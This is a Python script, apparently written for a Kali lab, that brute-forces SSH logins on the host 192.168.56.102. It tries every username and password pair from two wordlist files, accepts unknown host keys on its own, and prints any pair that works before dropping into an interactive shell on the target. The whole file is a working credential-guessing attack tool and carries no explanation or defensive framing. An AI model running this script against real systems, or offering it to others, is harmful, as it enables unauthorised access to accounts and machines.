import pexpect
import sys
 
def main():
    # Target SSH host
    ip = "192.168.56.102"
 
    # Wordlists on your Kali desktop
    user_file = "/home/kali/Desktop/username"
    pass_file = "/home/kali/Desktop/password"
 
    # Load username and password lists
    try:
        with open(user_file) as uf, open(pass_file) as pf:
            users = [u.strip() for u in uf if u.strip()]
            passwords = [p.strip() for p in pf if p.strip()]
    except Exception as e:
        print(f"[!] Error opening wordlists: {e}")
        sys.exit(1)
 
    # Iterate through all combinations
    for user in users:
        for password in passwords:
            print(f"[*] Trying {user}:{password}")
            try:
                # Spawn SSH process
                child = pexpect.spawn(f"ssh {user}@{ip}", timeout=10)
                # Handle known_hosts prompt or password prompt
                i = child.expect([
                    r"Are you sure you want to continue connecting \(yes/no\)\?", 
                    r"[Pp]assword:", 
                    pexpect.TIMEOUT, 
                    pexpect.EOF
                ])
                if i == 0:
                    # Accept new host key
                    child.sendline("yes")
                    i = child.expect([r"[Pp]assword:", pexpect.TIMEOUT, pexpect.EOF])
                if i == 1:
                    # Send the password
                    child.sendline(password)
                    j = child.expect([
                        r"Permission denied",   # failed
                        r"[#$]\s",             # shell prompt on success
                        pexpect.TIMEOUT,
                        pexpect.EOF
                    ], timeout=10)
 
                    if j == 1:
                        print(f"[+] SUCCESS: {user}:{password}")
                        # Drop into interactive shell
                        child.interact()
                        return
                    else:
                        print(f"[-] Failed: {user}:{password}")
                else:
                    print(f"[-] No password prompt for {user}@{ip}")
                child.close()
            except pexpect.ExceptionPexpect as e:
                print(f"[!] Exception with {user}:{password} -> {e}")
 
    print("[-] Bruteâ€‘force complete. No valid credentials found.")
 
if __name__ == "__main__":
    main()
